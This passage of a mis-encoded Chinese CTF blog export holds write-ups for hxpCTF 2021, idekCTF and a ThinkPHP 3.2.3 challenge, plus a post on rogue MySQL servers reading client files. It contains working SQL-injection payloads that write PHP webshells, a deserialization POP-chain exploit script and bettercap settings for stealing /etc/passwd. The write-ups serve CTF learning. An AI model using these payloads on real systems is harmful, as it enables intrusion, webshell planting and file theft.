·çš„ï¼\nç°åœ¨éœ€è¦ç¡®å®šè¿™ä¸ª$idå€¼ï¼Œæ˜¾ç„¶æœ¬åœ°å’Œè¿œç¨‹çš„$secretå€¼ä¸ä¸€æ · æ— æ³•æœ¬åœ°ç›´æ¥ä¼ªé€ ï¼Œæˆ‘ä»¬çš„æ–¹æ³•æ˜¯å¤§é‡çš„GETè¯·æ±‚æ¥è·å¾—å¤§é‡çš„æ–°cookieï¼Œè§‚å¯Ÿ|ä¹‹åçš„éƒ¨åˆ†çš„å‡ºç°ç›¸åŒçš„é¢‘ç‡ï¼Œå› ä¸ºä¸Šè¿°æƒ…å†µå‘ç”Ÿçš„æ¦‚ç‡æ˜¯1/256ï¼Œå¦‚æœå‘ç”Ÿäº†ä¸¤æ¬¡ å°±å¯ä»¥ç¡®å®šæ˜¯æˆ‘ä»¬è¦æ‰¾çš„$macå€¼\nimport requests from tqdm import tqdm macs = [] for _ in tqdm(range(1000)): response = requests.get(\u0026#39;http://65.108.176.96:8888/\u0026#39;) macs.append(response.cookies[\u0026#39;session\u0026#39;].split(\u0026#39;%7C\u0026#39;)[1]) mac_0 = max(macs, key=macs.count) print(mac_0) æœ‰äº†åˆé€‚çš„$macä¹‹åå†è€ƒè™‘å¦‚ä½•é€šè¿‡sqliå†™shellï¼Œæ ¹æ®cheat sheetæ•´ä¸€ä¸ªpayload\n1=1; ATTACH DATABASE \u0026#39;/var/www/html/data/qazxsw.php\u0026#39; as hackz;CREATE TABLE hackz.pwn (dataz text);INSERT INTO hackz.pwn (dataz) VALUES (\u0026#39;\u0026lt;?php echo system(\\\u0026#34;/readflag\\\u0026#34;); ?\u0026gt;\u0026#39;); -- xyz çœ‹ç€å¾ˆéªšçš„å†™shellæ–¹å¼ï¼Œä¹‹å‰åšé¢˜æ²¡æœ‰è§åˆ°è¿‡ï¼ˆè¿™æ³¢å­¦åˆ°äº†ï¼‰ï¼Œè¿™ä¸ªpayloadå°±æ”¾å…¥cookieçš„$idéƒ¨åˆ†å³å¯ï¼Œå¸¦ç€cookieè®¿é—®é¡µé¢postå†deleteä¸€æ¡å†…å®¹ï¼Œå†è½¬åˆ°/data/qazxsw.phpé¡µé¢å°±å¯ä»¥çœ‹åˆ°flagäº†\nimport requests import random import string from urllib.parse import quote remote_0_mac = \u0026#39;FlDRLIZWMTqtYjAugBkToe66C3Q5PaXnGAyzGL6VpiCmfl%2FQjtvYr2QavlI9lmsrMbQnpPfIMr979D1E4bBa71\u0026#39; cont = \u0026#39;\u0026#39; payload = quote(\u0026#34;1=1; ATTACH DATABASE \u0026#39;/var/www/html/data/qazxsw.php\u0026#39; as hackz;CREATE TABLE hackz.pwn (dataz text);INSERT INTO hackz.pwn (dataz) VALUES (\u0026#39;\u0026lt;?php echo system(\\\u0026#34;/readflag\\\u0026#34;); ?\u0026gt;\u0026#39;); -- xyz\u0026#34;) while \u0026#39;html\u0026#39; not in cont: random_id = \u0026#39;\u0026#39;.join(random.choice(string.ascii_letters) for _ in range(10)) cookies = { \u0026#39;session\u0026#39;: payload + random_id + \u0026#39;%7C\u0026#39; + remote_0_mac } response = requests.get(\u0026#39;http://65.108.176.96:8888/\u0026#39;, cookies=cookies) cont = response.text print(cookies) hxp{dynamically_typed_statically_typed_php_c_I_hate_you_all_equally__at_least_its_not_node_lol_:(}\nå‚è€ƒï¼šwp\n***counter Please check out our minimal view counter. I think itâ€™s secure. Anyway please no hacks.\nhttp://49.12.232.139:8008/\n\u0026lt;?php $rmf = function($file){ system(\u0026#39;rm -f -- \u0026#39;.escapeshellarg($file)); // }; $page = $_GET[\u0026#39;page\u0026#39;] ?? \u0026#39;default\u0026#39;; chdir(\u0026#39;./data\u0026#39;); if(isset($_GET[\u0026#39;reset\u0026#39;]) \u0026amp;\u0026amp; preg_match(\u0026#39;/^[a-zA-Z0-9]+$/\u0026#39;, $page) === 1) { $rmf($page); } file_put_contents($page, file_get_contents($page) + 1); include_once($page); https://gist.github.com/parrot409/3919a4e6ab1eae76d051c5a4d4cfa737\nhttps://tttang.com/archive/1384/#toc_0x03-counter-nginx-request-body-temp-lfi\n***includer\u0026rsquo;s revenge Just sitting here and waiting for PHP 8.1 (lolphp).\nhttp://65.108.176.254:8088/\n\u0026lt;?php ($_GET[\u0026#39;action\u0026#39;] ?? \u0026#39;read\u0026#39; ) === \u0026#39;read\u0026#39; ? readfile($_GET[\u0026#39;file\u0026#39;] ?? \u0026#39;index.php\u0026#39;) : include_once($_GET[\u0026#39;file\u0026#39;] ?? \u0026#39;index.php\u0026#39;); ä¸€å¥è¯phpï¼Œä¸ä¼šï¼Œæ‘†äº†\nZeddå¸ˆå‚…è¿™ç¯‡å¤ªå¼ºäº†ï¼Œæ·±å…¥åˆ†æNginx-\u0026gt;https://tttang.com/archive/1384/\nä½œä¸ºä¸€åwebçº¯èœç‹—ï¼Œå¤ªä½©æœå‡ºé¢˜äººäº†ï¼Œæ˜¯çœŸçš„å¼ºï¼Œå¥½å‰å®³å•Šå•Šå•Šå•Šå•Šå•Šå•Š\n","date":"2021-12-20T23:45:08+08:00","permalink":"https://amiaaaz.github.io/2021/12/20/hxpctf2021-wp/","section":"posts","tags":["wp"],"title":"hxpCTF2021 Wp"},{"categories":["NOTES\u0026SUMMARY"],"contents":"åº”è¯¥æ˜¯å„ä½å¸¦å¸ˆå‚…ä»¬æ—©å°±ä¼šçš„ç‚¹äº†ï¼Œåšé¢˜ç¢°åˆ°äº†æ‹¿å‡ºæ¥ç‚’ä¸ªå†·é¥­QwQï¼›å‚è€ƒé“¾æ¥ç»Ÿä¸€æ”¾åˆ°æœ€åé¢å•¦\nåŸç†\u0026amp;å¤ç° æ€»ä½“æ€è·¯æ˜¯è¿™æ ·çš„ï¼šä¼ªé€ ä¸€ä¸ªmysqlçš„æœåŠ¡ç«¯ï¼ˆä¸éœ€è¦æœ‰å®Œæ•´çš„æ•°æ®åº“çš„åŠŸèƒ½ åªéœ€å‘å®¢æˆ·ç«¯å›å¤greeting packageï¼‰å½“æœ‰å®¢æˆ·ç«¯è¿æ¥åˆ°æ—¶ï¼Œå¯ä»¥è¢«æœåŠ¡ç«¯è®¿é—®ä¸€ä¸ªå®¢æˆ·ç«¯æœ¬åœ°çš„æ–‡ä»¶ï¼ˆå¦‚æœæœ¬åœ°ç”¨æˆ·æƒé™å…è®¸çš„è¯\nå¸®åŠ©æˆ‘ä»¬å®ç°è¿™ä¸€ç›®æ ‡çš„sqlè¯­å¥æ˜¯LOAD DATA INFILEï¼Œå®ƒç”¨äºè¯»å–ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹æ”¾å…¥è¡¨ä¸­ï¼Œæœ‰ä¸¤ç§å½¢å¼\nLoad data infile \u0026#34;/data/data.csv\u0026#34; into table TestTable; Load data local infile \u0026#34;/data/data.csv\u0026#34; into table TestTable; # æœ‰æ—¶ä¸FIELDS TERMINATED BY \u0026#39;\\n\u0026#39;ä¸€èµ·ä½¿ç”¨ ä»¥ä¸Šä¸¤ç§å†™æ³•çš„å·®å¼‚åœ¨äºæ˜¯å¦æœ‰localï¼Œä¹Ÿå°±æ˜¯æ˜¯å¦è¯»å–clientæœ¬åœ°çš„æ–‡ä»¶\nåœ¨æœ¬åœ°ç”¨wiresharkæŠ“ä¸ªåŒ…åº·åº·è¿™ä¸€sqlè¯­å¥å…·ä½“æ˜¯æ€ä¹ˆæ‰§è¡Œçš„\nï¼ˆè‚¥è‚ æ„ä¹‰ä¸æ˜çš„æˆªå›¾ï¼ˆäº”ä¸ªæœˆè¿‡å»äº† èƒ½è®°å¾—æ‰æœ‰é¬¼\næ•´ä¸ªè¿‡ç¨‹ç®€åŒ–ä¸ºä»¥ä¸‹ä¸‰ä¸ªé˜¶æ®µ\nClient: Request Query: LOAD DATA LOCAL INFIEL \u0026lsquo;/etc/passwd\u0026rsquo; INTO TABLE test FIELDS TERMINATED BY \u0026lsquo;\\n\u0026rsquo; Server: Response TABULAR: /etc/passwd Client: Request[Malformed Packet]: content of /etc/passwd å¦‚æœåœ¨å®¢æˆ·ç«¯å‘é€æŸ¥è¯¢å è¿”å›ä¸€ä¸ªResponse TABULARåŒ… å¹¶æŒ‡å®šè¦è¯»å–çš„æ–‡ä»¶ å°±å¯ä»¥ä»»æ„è¯»å–å®¢æˆ·ç«¯æ–‡ä»¶äº†ï¼ˆå‰æä»ç„¶æ˜¯have read accessï¼‰\nç”šè‡³ä¸ä¸€å®šéœ€è¦å®¢æˆ·ç«¯é¦–å…ˆå‘èµ· LOAD DATA LOCALçš„è¯·æ±‚æ‰èƒ½responseï¼Œåœ¨å®˜æ–¹æ–‡æ¡£ç¬¬ä¸‰æ®µçš„æœ€åçš„æ‹¬å·ä¸­æç¤ºï¼Œä¼ªé€ çš„å®¢æˆ·ç«¯å¯ä»¥åœ¨ä»»ä½•æ—¶å€™å›å¤ä¸€ä¸ªfile-transferçš„è¯·æ±‚ï¼ˆä½†åˆ©ç”¨è¿™ä¸ªç‰¹æ€§å‰ å®¢æˆ·ç«¯å¿…é¡»å…·æœ‰CLIENT_LOCAL_FILESå±æ€§ ï¼ˆå¯ä»¥åœ¨è¿æ¥mysqlæ—¶æ·»åŠ  --enable-local-infile æˆ–è®¾ç½®local_infile=ON\næ‰€ä»¥ä¸€æ—¦æœ‰ä¸€å°æ¶æ„çš„mysqlæœåŠ¡å™¨ å‘å‡ºå®Œå…¨ç›¸åŒçš„æ•°æ®åŒ…å»æ¨¡æ‹Ÿåˆå§‹çš„greetingæ¡æ‰‹è¿‡ç¨‹ï¼Œä¹‹åç­‰å¾…ä¸€ä¸ªå®¢æˆ·ç«¯çš„å“åº”ï¼ˆå¹¸è¿çš„æ˜¯å¤§å¤šæ•°MySQLå®¢æˆ·ç«¯ä»¥åŠç¨‹åºåº“éƒ½ä¼šåœ¨æ¡æ‰‹ä¹‹åè‡³å°‘å‘é€ä¸€æ¬¡è¯·æ±‚ï¼Œä»¥æ¢æµ‹ç›®æ ‡å¹³å°çš„æŒ‡çº¹ä¿¡æ¯ï¼Œæ¯”å¦‚ï¼ˆselect @@version_comment limit 1ï¼‰ï¼Œå†ä¹‹åå°±å¯ä»¥ä¼ªé€ load data local infileæŒ‡ä»¤æ¥è·å–æ–‡ä»¶äº†\næˆ‘ä»¬æ„é€ ä¸€ä¸ªå…·æœ‰ä»¥ä¸‹å±æ€§çš„mysqlä¼ªæœåŠ¡ç«¯ï¼š\nå‘é€Server Greeting ç­‰å¾…client: Request Query package å›å¤è¯·æ±‚Response file-transfer éœ€è¦å‘çš„åŒ…æ ¼å¼éƒ½åœ¨å®˜æ–¹æ–‡æ¡£ä¸Šå¯ä»¥æ‰¾åˆ°ï¼šProtocol::LOCAL_INFILE_Request Protocol::Handshake\nå‡ ä¸ªå·²ç»é›†æˆè¿‡çš„ä¼ªé€ server: bettercap Rogue-MySql-Server\nå¯ä»¥ç”¨bettercapè¿›è¡Œå®Œç¾å®è·µ\néœ€è¦è®¾ç½®çš„é¡¹éå¸¸ç®€å•\nset mysql.server.address 0.0.0.0\t# å¦‚æœæƒ³ç”¨npsä¹‹ç±»çš„ä»£ç†å·¥å…·æ˜ å°„åˆ°å…¬ç½‘ç«¯å£è¯·åŠ¡å¿…è®¾ç½®æ­¤é¡¹ set mysql.server.infile /etc/passwd\t# æƒ³è¦è¯»å–çš„æ–‡ä»¶ set mysql.server.outfile /xxxx\t# ä¿å­˜åˆ°æœ¬åœ°çš„ä½ç½® set mysql.server.port 1099\t# éšæ„ç«¯å£éƒ½å¯ä»¥ mysql.server on [çº¢æ˜è°·CTF 2021]EasyTP tp3.2.3ï¼Œæœ‰ä¸€ä¸ªç°æˆçš„é“¾å­ï¼šThinkPHP v3.2.* ï¼ˆSQLæ³¨å…¥\u0026amp;æ–‡ä»¶è¯»å–ï¼‰ååºåˆ—åŒ–POPé“¾\nçœ‹Application\\Home\\Controller\\IndexController.class.phpçš„ä»£ç ä¹Ÿè·Ÿè¿™ä¸ªæ–‡ç« ä¸­çš„ç¤ºä¾‹ä»£ç å¤§å·®ä¸å·®ï¼Œé¡ºç€è¿™ç¯‡æ–‡ç« çš„æ€è·¯è·Ÿä¸€ä¸‹\né¦–å…ˆæ˜¯å…¨å±€å¯»æ‰¾__destruct()å‡½æ•°\nwww/ThinkPHP/Library/Think/Image/Driver/Imagick.class.php\nå¯»æ‰¾ä¸€ä¸ªdestroy()\nwww/ThinkPHP/Library/Think/Session/Driver/Memcache.class.php\nè¿™é‡Œéœ€è¦ä¸€ä¸ª$sessIDï¼ŒPHP7ä¸‹ä¸ä¼ å‚ä¼šæŠ¥é”™ PHP5ä¸å½±å“ï¼Œ$this-\u0026gt;sessionNameå¯æ§ï¼›æ¥ç€æ‰¾å«æœ‰delete()çš„ç±»\nwww/ThinkPHP/Mode/Lite/Model.class.php\nç›¸å½“äºä¼ å…¥çš„å‚æ•°éƒ½å¯ç”¨ï¼Œå¯ä»¥æ§åˆ¶è‡ªå¸¦çš„æ•°æ®åº“ç±»çš„delete()æ–¹æ³•äº†\nwww/ThinkPHP/Library/Think/Db/Driver.class.php\nå®ƒæ˜¯æ‹¼æ¥äº†$sqlè¯­å¥ï¼Œä¹‹åæ‰§è¡Œ$this-\u0026gt;execute()\nå®ƒä¼šé¢„å…ˆè¿›è¡Œ$this-\u0026gt;initConnect()\næˆ‘ä»¬å¯ä»¥æ§åˆ¶$configï¼Œæ§åˆ¶è¿æ¥ä»»æ„æ•°æ®åº“\nè¿™é‡Œå¯ä»¥ç»“åˆä¸Šé¢çš„mysqlä¼ªæœåŠ¡ç«¯ä»»æ„æ–‡ä»¶è¯»å–äº†ï¼Œæ¯”å¦‚ä»¥ä¸‹çš„åˆ©ç”¨æµç¨‹ï¼š\né€šè¿‡æŸå¤„æ³„éœ²å¾—åˆ°ç›®æ ‡çš„WEBç›®å½•ï¼ˆå¦‚DEBUGé¡µé¢ å¼€å¯MySQLä¼ªæœåŠ¡ç«¯ï¼Œè¯»å–ç›®æ ‡çš„æ•°æ®åº“é…ç½®æ–‡ä»¶ å‡ºå‘ååºåˆ—åŒ– è§¦å‘PDOè¿æ¥éƒ¨åˆ† è·å–åˆ°ç›®æ ‡çš„æ•°æ®åº“é…ç½®æ–‡ä»¶ ç”¨bettercapåšmysqlä¼ªæœåŠ¡ç«¯è¯»ä¸€ä¸‹/etc/passwd\n\u0026lt;?php namespace Think\\Db\\Driver{ use PDO; class Mysql{ protected $options = array( PDO::MYSQL_ATTR_LOCAL_INFILE =\u0026gt; true // å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶ ); protected $config = array( \u0026#34;debug\u0026#34; =\u0026gt; 1, \u0026#34;database\u0026#34; =\u0026gt; \u0026#34;\u0026#34;, \u0026#34;hostname\u0026#34; =\u0026gt; \u0026#34;your_vps\u0026#34;, \u0026#34;hostport\u0026#34; =\u0026gt; \u0026#34;port\u0026#34;, \u0026#34;charset\u0026#34; =\u0026gt; \u0026#34;utf8\u0026#34;, \u0026#34;username\u0026#34; =\u0026gt; \u0026#34;root\u0026#34;, \u0026#34;password\u0026#34; =\u0026gt; \u0026#34;root\u0026#34; ); } } namespace Think\\Image\\Driver{ use Think\\Session\\Driver\\Memcache; class Imagick{ private $img; public function __construct(){ $this-\u0026gt;img = new Memcache(); } } } namespace Think\\Session\\Driver{ use Think\\Model; class Memcache{ protected $handle; public function __construct(){ $this-\u0026gt;handle = new Model(); } } } namespace Think{ use Think\\Db\\Driver\\Mysql; class Model{ protected $options = array(); protected $pk; protected $data = array(); protected $db = null; public function __construct(){ $this-\u0026gt;db = new Mysql(); $this-\u0026gt;options[\u0026#39;where\u0026#39;] = \u0026#39;\u0026#39;; $this-\u0026gt;pk = \u0026#39;id\u0026#39;; $this-\u0026gt;data[$this-\u0026gt;pk] = array( \u0026#34;table\u0026#34; =\u0026gt; \u0026#34;mysql.user where 1=updatexml(1,concat(0x7e,user(),31) from test.flag),0x7e),1)#\u0026#34;, \u0026#34;where\u0026#34; =\u0026gt; \u0026#34;1=1\u0026#34; ); } } } namespace { echo base64_encode(serialize(new Think\\Image\\Driver\\Imagick())); $curl = curl_init(); curl_setopt_array($curl, array( CURLOPT_URL =\u0026gt; \u0026#34;http://6382172d-0bab-4e87-b434-7d711efad721.node3.buuoj.cn/\u0026#34;, CURLOPT_RETURNTRANSFER =\u0026gt; true, CURLOPT_ENCODING =\u0026gt; \u0026#34;\u0026#34;, CURLOPT_MAXREDIRS =\u0026gt; 10, CURLOPT_TIMEOUT =\u0026gt; 3, CURLOPT_HTTP_VERSION =\u0026gt; CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST =\u0026gt; \u0026#34;POST\u0026#34;, CURLOPT_POSTFIELDS =\u0026gt; base64_encode(serialize(new Think\\Image\\Driver\\Imagick())), CURLOPT_HTTPHEADER =\u0026gt; array( \u0026#34;Postman-Token: 348e180e-5893-4ab4-b1d4-f570d69f228e\u0026#34;, \u0026#34;cache-control: no-cache\u0026#34; ), )); $response = curl_exec($curl); $err = curl_error($curl); curl_close($curl); if ($err) { echo \u0026#34;cURL Error #:\u0026#34; . $err; } else { echo $response; } } çœ‹åˆ°äº†mysqlç”¨æˆ·ï¼Œå°è¯•å¼±å£ä»¤å¾—åˆ°root: root\nä¹‹åå°±å¯ä»¥æŠŠæˆ‘ä»¬çš„ä¼ªæœåŠ¡ç«¯æ’¤äº†ï¼Œæ¢æˆçœŸæœåŠ¡ç«¯çš„ï¼Œè¿›è¡Œä¸€ä¸ªæ³¨å…¥\nä½¿ç”¨ç›®æ ‡çš„æ•°æ®åº“é…ç½®å†æ¬¡è¿›è¡Œååºåˆ—åŒ– è§¦å‘DELETEè¯­å¥çš„SQLæ³¨å…¥ $this-\u0026gt;data[$this-\u0026gt;pk] = array( // \u0026#34;table\u0026#34; =\u0026gt; \u0026#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(schema_name),31) from information_schema.SCHEMATA)),1)#\u0026#34;, // \u0026#34;table\u0026#34; =\u0026gt; \u0026#34;mysql.user where 1=updatexml(1,concat(0x7e,(select right(group_concat(schema_name),31) from information_schema.SCHEMATA)),1)#\u0026#34;, // \u0026#34;table\u0026#34; =\u0026gt; \u0026#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(table_name),31) from information_schema.tables where table_schema=\u0026#39;test\u0026#39;),0x7e),1)#\u0026#34;, // \u0026#34;table\u0026#34; =\u0026gt; \u0026#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(column_name),31) from information_schema.columns where table_schema=\u0026#39;test\u0026#39;),0x7e),1)#\u0026#34;, \u0026#34;table\u0026#34; =\u0026gt; \u0026#34;mysql.user where 1=updatexml(1,concat(0x7e,(select right(group_concat(flag),31) from test.flag),0x7e),1)#\u0026#34;, \u0026#34;where\u0026#34; =\u0026gt; \u0026#34;1=1\u0026#34; ); æˆ‘ä»¬è¿˜å¯ä»¥æŠŠå †å æ‰“å¼€ï¼Œç”¨å †å æ³¨å…¥å†™shellï¼Œä¹Ÿå°±æ˜¯æœ¬é¢˜çš„expï¼ˆå‚è€ƒèµµæ€»çš„exp èµµæ€»ç‰›é€¼\n\u0026lt;?php namespace Think\\Db\\Driver{ use PDO; class Mysql{ protected $options = array( PDO::MYSQL_ATTR_LOCAL_INFILE =\u0026gt; true , // å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶ PDO::MYSQL_ATTR_MULTI_STATEMENTS =\u0026gt; true, // æ‰“å¼€å †å æ³¨å…¥ ); protected $config = array( \u0026#34;debug\u0026#34; =\u0026gt; 1, \u0026#34;database\u0026#34; =\u0026gt; \u0026#34;\u0026#34;, \u0026#34;hostname\u0026#34; =\u0026gt; \u0026#34;127.0.0.1\u0026#34;, \u0026#34;hostport\u0026#34; =\u0026gt; \u0026#34;3306\u0026#34;, \u0026#34;charset\u0026#34; =\u0026gt; \u0026#34;utf8\u0026#34;, \u0026#34;username\u0026#34; =\u0026gt; \u0026#34;root\u0026#34;, // çŒœå‡ºå¼±å£ä»¤ \u0026#34;password\u0026#34; =\u0026gt; \u0026#34;root\u0026#34; ); } } namespace Think\\Image\\Driver{ use Think\\Session\\Driver\\Memcache; class Imagick{ private $img; public function __construct(){ $this-\u0026gt;img = new Memcache(); } } } namespace Think\\Session\\Driver{ use Think\\Model; class Memcache{ protected $handle; public function __construct(){ $this-\u0026gt;handle = new Model(); } } } namespace Think{ use Think\\Db\\Driver\\Mysql; class Model{ protected $options = array(); protected $pk; protected $data = array(); protected $db = null; public function __construct(){ $this-\u0026gt;db = new Mysql(); $this-\u0026gt;options[\u0026#39;where\u0026#39;] = \u0026#39;\u0026#39;; $this-\u0026gt;pk = \u0026#39;id\u0026#39;; $this-\u0026gt;data[$this-\u0026gt;pk] = array( // å †å æ³¨å…¥å†™å…¥shell \u0026#34;table\u0026#34; =\u0026gt; \u0026#34;mysql.user where 1=1;select \u0026#39;\u0026lt;?php eval(\\$_POST[amiz]);?\u0026gt;\u0026#39; into outfile \u0026#39;/var/www/html/amiz.php\u0026#39;;#\u0026#34;, \u0026#34;where\u0026#34; =\u0026gt; \u0026#34;1=1\u0026#34; ); } } } namespace { echo base64_encode(serialize(new Think\\Image\\Driver\\Imagick())); $curl = curl_init(); curl_setopt_array($curl, array( CURLOPT_URL =\u0026gt; \u0026#34;http://914146f1-7d08-4a0a-9659-c143df1d68e1.node4.buuoj.cn:81/\u0026#34;, CURLOPT_RETURNTRANSFER =\u0026gt; true, CURLOPT_ENCODING =\u0026gt; \u0026#34;\u0026#34;, CURLOPT_MAXREDIRS =\u0026gt; 10, CURLOPT_TIMEOUT =\u0026gt; 3, CURLOPT_HTTP_VERSION =\u0026gt; CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST =\u0026gt; \u0026#34;POST\u0026#34;, CURLOPT_POSTFIELDS =\u0026gt; base64_encode(serialize(new Think\\Image\\Driver\\Imagick())), CURLOPT_HTTPHEADER =\u0026gt; array( \u0026#34;cache-control: no-cache\u0026#34; ), )); $response = curl_exec($curl); $err = curl_error($curl); curl_close($curl); if ($err) { echo \u0026#34;cURL Error #:\u0026#34; . $err; } else { echo $response; } } å…¶ä¸­curlçš„ä»£ç æ˜¯ç”¨postmanç”Ÿæˆçš„ ï¼ˆpostmanæ‰“é’±ï¼‰ ä¸€å¥—è¿æ‹›ç›´æ¥å¸¦èµ°ï¼Œç”¨èšå‰‘è¿æ¥ä¹‹åå‘ç°æ ¹ç›®å½•ä¸‹æ²¡æœ‰flagï¼Œåè€Œæ˜¯ä¸€ä¸ªflag.sh\næˆ‘ä»¬è¿˜å¾—è¿ä¸Šæ•°æ®åº“çœ‹çœ‹\nä½†æ˜¯èšå‰‘è‡ªå¸¦çš„æ·»åŠ å¤±è´¥ï¼Œç›´æ¥æ‰‹åŠ¨å†™ä¸€ä¸ªå†°èçš„ğŸ\nç›´æ¥æŸ¥çœ‹ä¹Ÿæ˜¯æ²¡æœ‰ï¼Œä½†æ˜¯å¯ä»¥ç”¨å®ƒçš„å¯¼å‡ºæ•°æ®åº“çš„åŠŸèƒ½å¾—åˆ°æ•°æ®\nå‚è€ƒï¼šwp1 | wp2\n[DDCTF 2019]MySQLå¼±å£ä»¤ æ²¡æ‰¾åˆ°ç¯å¢ƒï¼Œçœ‹wpäº‘ä¸€ä¸‹\néƒ¨ç½²å¥½agent.pyä¹‹åç”¨bettercapï¼Œè¯»/root/.mysql_historyæ‹¿flagä¸€æ³¢å¸¦èµ°\nå‚è€ƒï¼šwp\nä¸€ä¸ªä¸­ç­‰å¥½çš„èœœç½ ä¹‹æ‰€ä»¥è¯´ä¸­ç­‰å¥½ï¼Œæ˜¯å› ä¸ºå®ƒå—åˆ¶äºå¯¹åº”æ•°æ®åº“çš„ç‰ˆæœ¬å’Œé…ç½®æƒ…å†µï¼Œæ‰€ä»¥å¹¶ä¸å¤Ÿé€šç”¨ï¼Œå¯ä»¥å‚è€ƒä»¥ä¸‹ä¸¤ä¸ªæ —å­ï¼š\nå‚è€ƒï¼šMySQLèœœç½è·å–æ”»å‡»è€…å¾®ä¿¡ID | æº¯æºååˆ¶ä¹‹MySQLèœœç½ç ”ç©¶\nå””ï¼Œæ˜¯7æœˆåšé¢˜çš„æ—¶å€™ç¢°åˆ°çš„ç‚¹ï¼Œä»Šå¤©åšé¢˜åˆç¢°åˆ°äº†ï¼Œäºæ˜¯æ‹¿å‡ºæ¥é­ä¸ªå°¸ï¼Œæ¯”ä¹‹å‰çš„ç†è§£è¦æ·±åˆ»ä¸€äº›äº†\næœ€è¿‘åœ¨çœ‹jsåŸå‹æ±¡æŸ“çš„ç›¸å…³é—®é¢˜ï¼Œç»“æœè€ƒäº†ä¸ªå››çº§ä¹‹åä¹‹å‰å†™çš„ä»£ç éƒ½ä¸è®¤å¾—äº†ğŸ˜…å°ä¸‘ç«Ÿæ˜¯æˆ‘è‡ªå·±\nä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ğŸ”— æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ MySQL connect file read Read MySQL Client\u0026rsquo;s File | ä»MySQLå‡ºå‘çš„åå‡»ä¹‹è·¯ å¦‚ä½•åˆ©ç”¨MySQL LOCAL INFILEè¯»å–å®¢æˆ·ç«¯æ–‡ä»¶ MySQLèœœç½è·å–æ”»å‡»è€…å¾®ä¿¡ID | æº¯æºååˆ¶ä¹‹MySQLèœœç½ç ”ç©¶ ","date":"2021-12-19T20:22:54+08:00","permalink":"https://amiaaaz.github.io/2021/12/19/mysql-pseudo-server/","section":"posts","tags":["MySQL","èœœç½"],"title":"MySQLä¼ªæœåŠ¡ç«¯è¯»å®¢æˆ·ç«¯ä»»æ„æ–‡ä»¶"},{"categories":["CTF"],"contents":"https://ctf.idek.team/Challenges æ³¨å†Œä¹‹åä¸€ç›´æ”¶ä¸åˆ°éªŒè¯é‚®ä»¶ï¼Œgmailå’Œqqé‚®ç®±éƒ½ä¸è¡Œï¼Œä½†æ˜¯å¥½åƒå¯ä»¥ç›´æ¥çœ‹é¢˜\nMemory of PHP Try to understand how string and variable work in php and also url. http://memory-of-php.rf.gd/\n\u0026lt;?php include(__DIR__.\u0026#34;/lib.php\u0026#34;); $check = substr($_SERVER[\u0026#39;QUERY_STRING\u0026#39;], 0, 32); if (preg_match(\u0026#34;/best-team/i\u0026#34;, $check)) { echo \u0026#34;Who is the best team?\u0026#34;; } if ($_GET[\u0026#39;best-team\u0026#39;] === \u0026#34;idek_is_the_best\u0026#34;) { echo \u0026#34;That a right answer, Here is my prize, \u0026lt;br\u0026gt;\u0026#34;; echo $flag; } show_source(__FILE__); ?\u0026gt; /?best-team=idek_is_the_best è¿›å…¥http://memory-of-php.rf.gd/secure-bypass.php\n\u0026lt;?php include __DIR__.\u0026#34;/lib2.php\u0026#34;; if (isset($_GET[\u0026#39;url\u0026#39;][15])) { header(\u0026#34;location: {$_GET[\u0026#39;url\u0026#39;]}\u0026#34;); echo \u0026#34;Your url is interesting, here is prize {$flag} \u0026lt;br\u0026gt;\u0026#34;; } else { echo \u0026#34;Plz make me interest with your url \u0026lt;br\u0026gt;\u0026#34;; } show_source(__FILE__); ?\u0026gt; /secure-bypass.php?url[15]=1 idek{nu11_by1e_bypass1ng_1s_C0ol!_ftw_br0!!!!}\nCookie-and-milk I love to eat cookie and milk together. And you?\nhttp://cookie-and-milk.rf.gd/\n\u0026lt;?php include(__DIR__.\u0026#34;/lib.php\u0026#34;); extract($_GET); if ($_SESSION[\u0026#39;idek\u0026#39;] === $_COOKIE[\u0026#39;idek\u0026#39;]) { echo \u0026#34;I love c0000000000000000000000000000000000000kie\u0026#34;; } else if ( sha1($_SESSION[\u0026#39;idek\u0026#39;]) == sha1($_COOKIE[\u0026#39;idek\u0026#39;]) ) { echo $flag; } show_source(__FILE__); ?\u0026gt; æ¯”è¾ƒç‹—çš„ä¸€ç‚¹æ˜¯å®ƒé‡å®šå‘çš„æ—¶å€™ä¼šåˆ é™¤æˆ‘ä»¬çš„cookieï¼Œæ‰€ä»¥è¦å•ç‹¬æŠ“åŒ…æ”¹ä¸€ä¸‹\nidek{C0okie_s1ea1ing_1s_c0ol!!!}\ndifference-check It\u0026rsquo;s important two know what differences exist, so I created a simple tool to check the difference between two websites!\nhttp://difference-check.chal.idek.team | https://ctf.idek.team/handouts/web/DifferenceCheck/difference-check-dist.zip\nå¯ä»¥æä¾›ä¸¤ä¸ªurlï¼Œä¼šè¿›è¡Œdiffç„¶åè¿”å›ç»“æœ\nä½¿ç”¨çš„æ˜¯node-fetchå’Œdiffåº“ï¼›åº·ä¸€åº·æºç \nconst express = require(\u0026#39;express\u0026#39;); const bodyParser = require(\u0026#39;body-parser\u0026#39;); const app = express(); const ssrfFilter = require(\u0026#39;ssrf-req-filter\u0026#39;); const fetch = require(\u0026#39;node-fetch\u0026#39;); const Diff = require(\u0026#39;diff\u0026#39;); const hbs = require(\u0026#39;express-handlebars\u0026#39;); const port = 1337; const flag = \u0026#39;idek{REDACTED}\u0026#39;; app.use(bodyParser.urlencoded({ extended: true })); app.engine(\u0026#39;hbs\u0026#39;, hbs.engine({ defaultLayout: \u0026#39;main\u0026#39;, extname: \u0026#39;.hbs\u0026#39; })); app.set(\u0026#39;view engine\u0026#39;, \u0026#39;hbs\u0026#39;); async function validifyURL(url){ valid = await fetch(url, {agent: ssrfFilter(url)}) .then((response) =\u0026gt; { return true }) .catch(error =\u0026gt; { return false }); return valid; }; async function diffURLs(urls){ try{ const pageOne = await 